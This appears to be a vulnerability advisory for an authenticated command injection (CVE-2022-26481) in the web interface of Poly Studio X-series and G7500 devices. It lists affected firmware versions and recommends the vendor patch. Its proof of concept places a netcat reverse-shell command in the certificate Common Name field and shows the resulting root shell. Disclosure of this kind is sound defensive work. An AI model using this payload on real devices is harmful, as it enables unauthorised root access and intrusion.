Multiple Poly devices are prone to an authenticated OS Command Injection vulnerability. The commands are executed with root privileges.

## Vendor description

*"Experience full board-room-quality audio, and knock-your-socks-off video, for mid-sized rooms. The Poly Studio X50 all-in-one video bar is radically simple to use with support for leading cloud video services built right in—no PC or Mac required. Voices are crisp and clear. Video feels natural. And wireless content sharing lets users collaborate from their devices without cables or pucks."*

## Business recommendation

The vendor provides a patch which should be installed immediately.

## Vulnerability overview/description

### 1) Authenticated Command Injection with Elevated Privileges (CVE-2022-26481)

An authenticated Command Injection vulnerability exists in the web interface when creating a certificate. An attacker is able to execute commands with root privileges.

## Proof of concept

### 1) Authenticated Command Injection with Elevated Privileges (CVE-2022-26481)

When being authenticated:

1. In the system web interface, go to Security > Certificates.

2. Select Create Certificate Signing Request (CSR).

3. In the Certificate Details form, complete the following fields:

```
Common Name (CN): $(busybox nc 10.0.0.1 8888 -e /system/bin/sh)

(steps taken from
```

The previously started nc listener receives a connection from the camera as root:

```
$ nc -lvp 8888
connect to [10.0.0.1] from (UNKNOWN) [10.0.0.2]
$ pwd
/oem/polycom/bin
$ whoami
root
```
## Vulnerable / tested versions

At least the following firmware versions of Poly Studio X30, Studio X50, Studio X70 and G7500 are affected:

* 3.4.0
* 3.5.0
* 3.6.0
